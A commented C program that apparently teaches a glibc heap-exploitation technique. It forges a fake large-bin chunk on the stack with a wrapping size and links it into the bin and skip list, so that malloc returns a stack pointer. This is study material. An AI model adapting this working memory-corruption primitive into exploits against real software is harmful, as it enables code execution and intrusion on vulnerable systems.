#include <stdio.h>
#include <stdlib.h>

#define CHUNK_SIZE0 0x080
#define CHUNK_SIZE1 0x440
#define CHUNK_SIZE2 0x450

void main() {
    long *chunk0,
            *chunk1;

    long stack_array[20];

    // So this time around, again we will be trying to get malloc to allocate a stack ptr.
    // This time, we will be leveraging the large bin skiplist.
    // However, we will be doing things a little differently this time.
    // Similar to the previous instances, we will be making a fake chunk
    // Except this time, we will set the size to 0xfffffffffffffff0
    // This would cause the address of the next chunk to wrap around, and legit be the 0x10 bytes before our fake chunk header
    // This would make it extremely convenient, to pass the sizeof(fake_chunk) == prev_size(next_chunk_after_fake_chunk)

    // Allocate, and free two chunks
    // Insert them into the unsorted bin
    // Allocate chunks in between, to prevent consolidation
    chunk0 = malloc(CHUNK_SIZE1);
    malloc(CHUNK_SIZE0);
    chunk1 = malloc(CHUNK_SIZE2);
    malloc(CHUNK_SIZE0);

    free(chunk0);
    free(chunk1);

    // Malloc a chunk, larger than any other unsorted bin chunks
    // Move the two chunks over to the large bin
    // Since they are different sizes, they will both end up in the skip list
    malloc(CHUNK_SIZE2+0x10);

    // Now to create our fake chunk
    // First we will start off with the fake chunk's size, and prev_size
    // The size will be 0xfffffffffffffff0 (prev_inuse set)
    // And prev_size will be 0x00
    stack_array[10] = 0x0000000000000000; // Fake chunk prev_size
    stack_array[11] = 0xfffffffffffffff1; // and chunk size

    // Now for the chunk header after our fake chunk
    // Since the size of the chunk is 0xfffffffffffffff0
    // And this is a 64 bit architecture, it will legit
    // Wrap around, and be the previous 0x10 bytes
    // The prev_size we will set to `0xfffffffffffffff0`
    // And the size we willset to `0x40` (I don't know if the chunk size matters here)
    stack_array[8] = 0xfffffffffffffff0; // Next chunk after fake chunk prev_size
    stack_array[9] = 0x0000000000000041; // and chunk size

    // So, we have made our fake large bin chunk,
    // Time to link it into the large bin
    // Both the doubly linked list, and the skip list
    // However, there is one thing to take note of

    // The skiplist iteration will iterate, from the smallest chunk to the largest
    // This way, it should find "the best fit"
    // As long as none of the chunks prior to it in the skip list are large enough
    // for the allocation, it will guarantee our fake largebin chunk gets allocated

    // So let's go and link our fake chunk into the large bin, and skip list

    // Starting with our fake chunk

    stack_array[12] = ((long)chunk0 - 0x10); // Set our fake chunk's fwd
    stack_array[13] = ((long)chunk1 - 0x10); // Set our fake chunk's bk

    stack_array[14] = ((long)chunk0 - 0x10); // Set our fwd_nextsize
    stack_array[15] = ((long)chunk1 - 0x10); // Set our bk_nextsize

    // Now we will insert our fake chunk, in between the two large bin chunks
    // For both the doubly linked list, and skip liist

    chunk0[1] = (long)(&stack_array[10]); // bk
    chunk0[3] = (long)(&stack_array[10]); // bk_nextsize
    chunk1[0] = (long)(&stack_array[10]); // fwd
    chunk1[2] = (long)(&stack_array[10]); // fwd_nextsize

    // Now, all that is left to do, is call malloc with a size that will get us our fake chunk

    malloc(CHUNK_SIZE2);

    // One thing to note here. While this will give us a fake stack chunk, we have the remainder to deal with
    // When a large bin chunk that is being allocated that is sufficiently larger than the allocation size
    // It will split the chunk into two, and the leftover potion will be the remainder
    // The remainder will be inserted into the unsorted bin

    // Due to the huge size of the remainder here, it will cause problems and fail checks if malloc
    // looks at it for allocation of the new unsorted bin chunk, so we have to be careful about how we call malloc after this.
    // Also, this exact method may not be possible in future libc versions, as what checks are done changes.
}
